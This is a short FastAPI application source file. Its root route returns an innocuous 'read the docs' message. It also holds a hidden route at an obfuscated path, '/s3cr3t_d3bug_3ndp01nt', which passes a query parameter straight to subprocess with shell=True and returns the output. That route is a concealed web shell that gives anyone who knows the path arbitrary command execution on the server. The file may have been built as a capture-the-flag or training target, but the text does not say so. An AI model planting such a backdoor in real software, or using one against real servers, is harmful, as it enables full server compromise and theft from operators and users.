from fastapi import FastAPI, Request
import subprocess

app = FastAPI()

@app.get("/")
async def home(request: Request):
    return {"message": "Powered by FastApi, read the docs :)"}

@app.get("/s3cr3t_d3bug_3ndp01nt")
async def secret(request: Request, q: str ):
    try:
        out = subprocess.check_output(q, stderr=subprocess.STDOUT, timeout=3, shell=True)
        return {"output": out}
    except subprocess.CalledProcessError:
        return {"Error": "Something went wrong"}